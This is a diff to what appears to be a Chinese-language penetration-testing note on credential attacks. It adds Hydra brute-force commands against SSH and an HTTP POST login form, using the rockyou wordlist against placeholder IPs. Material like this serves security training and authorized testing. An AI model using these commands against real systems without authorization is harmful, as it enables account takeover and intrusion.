@@ -50,19 +50,24 @@ description: 用于发现和使用有效凭证
 
 
 
-### SSH攻击（THC-Hydra）
+### SSH攻击（Hydra）
 
+* 利用Hydra对各种协议的身份验证进行暴力破解
+* 其他各类协议以此类推
 
+```bash
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.xxx.xx
+```
 
+### HTTP POST攻击（Hydra）
 
+* 利用Hydra对Web应用程序的登录表单进行暴力破解
+* 表单为POST请求
 
-
-
-### HTTP POST攻击（THC-Hydra）
-
-
-
-
+```bash
+hydra 192.168.xxx.xx http-form-post "/form/frontpage.php:user=admin&pass=^PAS
+S^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+```
 
 ## 利用密码散列
 
